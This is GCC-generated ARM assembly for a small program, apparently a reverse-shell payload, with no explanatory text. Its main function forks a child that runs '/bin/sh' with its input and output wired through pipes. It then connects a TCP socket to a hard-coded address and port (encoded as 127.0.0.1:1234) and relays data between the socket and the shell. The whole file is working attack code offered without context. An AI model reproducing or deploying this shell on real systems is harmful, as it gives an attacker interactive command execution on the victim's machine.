	.arch armv6
	.eabi_attribute 28, 1
	.eabi_attribute 20, 1
	.eabi_attribute 21, 1
	.eabi_attribute 23, 3
	.eabi_attribute 24, 1
	.eabi_attribute 25, 1
	.eabi_attribute 26, 2
	.eabi_attribute 30, 4
	.eabi_attribute 34, 1
	.eabi_attribute 18, 4
	.file	"nix_async.c"
	.section	.text.startup,"ax",%progbits
	.align	2
	.global	main
	.syntax unified
	.arm
	.fpu vfp
	.type	main, %function
main:
	@ args = 0, pretend = 0, frame = 8360
	@ frame_needed = 0, uses_anonymous_args = 0
	push	{r4, r5, r6, r7, r8, r9, r10, lr}
	sub	sp, sp, #8320
	sub	sp, sp, #48
	add	r7, sp, #48
	sub	r0, r7, #40
	bl	pipe
	sub	r0, r7, #32
	bl	pipe
	bl	fork
	subs	r9, r0, #0
	bne	.L2
	mov	r1, r9
	ldr	r0, [sp, #8]
	bl	dup2
	mov	r1, #1
	ldr	r0, [sp, #20]
	bl	dup2
	mov	r1, #2
	ldr	r0, [sp, #20]
	bl	dup2
	ldr	r0, [sp, #8]
	bl	close
	ldr	r0, [sp, #12]
	bl	close
	ldr	r0, [sp, #16]
	bl	close
	ldr	r0, [sp, #20]
	bl	close
	ldr	r0, .L16
	mov	r2, r9
	sub	r1, r7, #24
	str	r0, [sp, #24]
	str	r9, [sp, #28]
	bl	execve
.L3:
	ldr	r0, [sp, #12]
	bl	close
	ldr	r0, [sp, #16]
	bl	close
	mov	r0, #0
	add	sp, sp, #8320
	add	sp, sp, #48
	@ sp needed
	pop	{r4, r5, r6, r7, r8, r9, r10, pc}
.L2:
	ldr	r0, [sp, #8]
	bl	close
	ldr	r0, [sp, #20]
	bl	close
	mov	r2, #0
	mov	r1, #1
	mov	r0, #2
	bl	socket
	mov	r3, #2
	strh	r3, [sp, #32]	@ movhi
	ldr	r3, .L16+4
	mov	r2, #16
	strh	r3, [sp, #34]	@ movhi
	ldr	r3, .L16+8
	sub	r1, r7, #16
	str	r3, [sp, #36]
	mov	r8, #1
	mov	r4, r0
	bl	connect
	cmp	r4, #0
	add	r5, r4, #31
	movge	r5, r4
	rsbs	r3, r4, #0
	and	r3, r3, #31
	and	r6, r4, #31
	rsbpl	r6, r3, #0
	asr	r5, r5, #5
	add	r3, sp, #176
	lsl	r6, r8, r6
	add	r5, r3, r5, lsl #2
.L8:
	mov	r10, #0
.L7:
	mov	r3, #0
.L4:
	str	r10, [r7, r3, lsl #2]
	add	r3, r3, #1
	cmp	r3, #32
	bne	.L4
	ldr	r3, [r5, #-128]
	add	r1, sp, #176
	orr	r3, r3, r6
	str	r3, [r5, #-128]
	ldr	r3, [sp, #16]
	mov	r0, #1024
	cmp	r3, #0
	add	r2, r3, #31
	movge	r2, r3
	asr	r2, r2, #5
	add	r2, r1, r2, lsl #2
	rsbs	r1, r3, #0
	and	r1, r1, #31
	and	r3, r3, #31
	rsbpl	r3, r1, #0
	ldr	r1, [r2, #-128]
	orr	r3, r1, r8, lsl r3
	mov	r1, r7
	str	r3, [r2, #-128]
	str	r10, [sp]
	mov	r3, r10
	mov	r2, #0
	bl	select
	cmp	r0, #0
	blt	.L5
	ldr	r3, [r5, #-128]
	tst	r6, r3
	beq	.L6
	mov	r2, #8192
	add	r1, sp, #176
	mov	r0, r4
	bl	read
	subs	r2, r0, #0
	ble	.L5
	add	r1, sp, #176
	ldr	r0, [sp, #12]
	bl	write
.L6:
	ldr	r0, [sp, #16]
	add	r2, sp, #176
	cmp	r0, #0
	add	r3, r0, #31
	movge	r3, r0
	rsbs	r1, r0, #0
	asr	r3, r3, #5
	and	r1, r1, #31
	add	r3, r2, r3, lsl #2
	and	r2, r0, #31
	ldr	r3, [r3, #-128]
	rsbpl	r2, r1, #0
	ands	r3, r3, r8, lsl r2
	beq	.L7
	mov	r2, #8192
	add	r1, sp, #176
	bl	read
	subs	r2, r0, #0
	ble	.L5
	add	r1, sp, #176
	mov	r0, r4
	bl	write
	b	.L8
.L5:
	mov	r1, #17
	mov	r0, r9
	bl	kill
	mov	r0, r4
	bl	close
	b	.L3
.L17:
	.align	2
.L16:
	.word	.LC0
	.word	-11772
	.word	16777343
	.size	main, .-main
	.section	.rodata.str1.1,"aMS",%progbits,1
.LC0:
	.ascii	"/bin/sh\000"
	.ident	"GCC: (Raspbian 6.3.0-18+rpi1) 6.3.0 20170516"
	.section	.note.GNU-stack,"",%progbits
